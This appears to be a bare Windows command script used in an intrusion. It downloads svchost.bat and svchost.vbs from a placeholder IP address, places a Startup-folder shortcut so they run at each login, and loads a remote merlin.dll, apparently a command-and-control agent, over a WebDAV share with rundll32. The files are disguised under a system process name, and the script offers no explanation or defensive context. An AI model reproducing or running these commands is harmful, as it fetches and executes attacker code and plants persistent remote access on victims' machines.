cd %userprofile%\AppData\Local
powershell wget http://<ip_address>/svchost.bat -outfile svchost.bat
powershell wget http://<ip_address>/svchost.vbs -outfile svchost.vbs
cd %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('svchost.lnk');$s.TargetPath='%userprofile%\AppData\Local\svchost.vbs';$s.Save()"
net use B: \\<ip_address>\webdav /persistent:no
net use B: /delete
rundll32.exe \\<ip_address>\webdav\merlin.dll,Run
